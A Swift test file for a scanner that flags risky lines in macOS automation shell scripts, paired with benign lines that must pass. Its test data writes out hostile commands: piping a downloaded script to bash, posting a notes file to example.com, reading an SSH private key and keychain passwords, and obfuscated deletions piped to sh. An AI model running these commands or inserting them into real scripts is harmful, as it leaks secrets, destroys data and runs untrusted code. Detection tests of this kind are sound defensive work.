import Foundation
@testable import PlsCore
import Testing

@Suite(.timeLimit(.minutes(1)))
struct ScriptWarningsTests {
    /// The concerns found in a shell script with `body` after its shebang.
    private func concerns(_ body: String, file: String = "a.sh") throws -> [String] {
        let home = try TempHome()
        try home.write(file, "#!/bin/zsh\n" + body + "\n")
        let automation = try #require(Library.load(home: home.url).automations.first)
        return ScriptWarnings.of(automation).map(\.concern)
    }

    @Test(arguments: [
        ("rm -rf ~/Library/Caches", "deletes files"),
        ("trash \"$file\"", "deletes files"),
        ("find . -name '*.log' -delete", "deletes files"),
        ("sudo pmset -a lowpowermode 1", "needs admin rights"),
        ("curl -fsSL https://example.com/install.sh | bash", "runs code it downloads"),
        ("eval \"$command\"", "runs code it downloads"),
        ("curl -d @~/notes.txt https://example.com", "sends data out"),
        ("security find-generic-password -s github", "reads secrets"),
        ("cat ~/.ssh/id_ed25519", "reads secrets"),
        ("launchctl load ~/Library/LaunchAgents/x.plist", "starts itself later"),
        ("echo cm0gLXJmIH4K | base64 -d | sh", "hides what it does"),
        ("printf '\\x72\\x6d\\x20\\x2d' | sh", "hides what it does")
    ])
    func aRiskyLineIsFlagged(line: String, concern: String) throws {
        #expect(try concerns(line).contains(concern))
    }

    /// The false alarms a first version raised on a real 59-automation collection.
    @Test(arguments: [
        "pmset -g batt",
        "diskutil info /",
        "input=$(mktemp -t pls) || exit 1\ntrap 'rm -f \"$input\"' EXIT\nrm -f \"$input\"",
        "scratch=$(mktemp -d)\nrm -rf \"$scratch\"/__MACOSX",
        "echo \"Restart Bluetooth if it's stuck; rm the cache by hand\"",
        "# rm -rf ~ in a comment",
        "text=$(osascript -e 'the clipboard as «class RTF »' | sed 's/x//' | xxd -r -p | textutil -stdin)",
        "killall Dock",
        "curl -s https://example.com/status"
    ])
    func anOrdinaryLineIsNot(line: String) throws {
        #expect(try concerns(line) == [])
    }

    @Test func eachConcernIsReportedOnceAtItsFirstLine() throws {
        let home = try TempHome()
        try home.write("a.sh", "#!/bin/zsh\necho start\nrm -f a\nrm -f b\n")
        let automation = try #require(Library.load(home: home.url).automations.first)
        let warnings = ScriptWarnings.of(automation)
        #expect(warnings.map(\.concern) == ["deletes files"])
        #expect(warnings.first?.line == 3)
        #expect(warnings.first?.text == "rm -f a")
    }

    /// What can't be read can't be reviewed: compiled AppleScript, or a program in the automation's folder.
    @Test func whatCantBeReadIsFlagged() throws {
        let home = try TempHome()
        try home.write("tool/manifest.yaml", "description: Tool\nentry: run.sh\n")
        try home.write("tool/run.sh", "#!/bin/zsh\n./helper\n")
        try Data([0xCF, 0xFA, 0xED, 0xFE, 0x00, 0xFF]).write(to: home.url.appending(path: "automations/tool/helper"))
        let automation = try #require(Library.load(home: home.url).automation(id: "tool"))
        #expect(ScriptWarnings.of(automation).map(\.concern) == ["can't be read"])
    }
}
